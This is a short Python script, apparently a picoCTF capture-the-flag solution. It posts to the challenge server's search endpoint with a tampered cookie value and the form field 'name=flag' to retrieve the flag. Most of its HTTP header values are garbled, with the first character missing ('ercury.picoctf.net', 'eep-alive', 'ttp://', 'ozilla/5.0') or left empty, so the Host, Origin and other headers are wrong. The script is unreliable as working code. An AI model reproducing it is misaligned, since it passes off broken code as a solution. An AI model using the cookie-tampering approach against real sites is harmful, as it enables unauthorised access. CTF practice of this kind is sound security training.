import requests

url = "http://mercury.picoctf.net:17781/search"
cookies = {
  "name": "0",
}

headers = {
  "Host": "ercury.picoctf.net:17781",
  "Connection": "eep-alive",
  "Cache-Control": "ax-age=0",
  "Origin": "ttp://mercury.picoctf.net:17781",
  "Content-Type": "pplication/x-www-form-urlencoded",
  "Upgrade-Insecure-Requests": "",
  "User-Agent": "ozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
  "Accept": "ext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
  "Sec-GPC": "",
  "Accept-Language": "n-US,en;q=0.6",
  "Referer": "ttp://mercury.picoctf.net:17781/",
  "Accept-Encoding": "zip, deflate"
}
data = """name=flag"""

res = requests.post(url, headers=headers, cookies=cookies, data=data)
print(res.text)

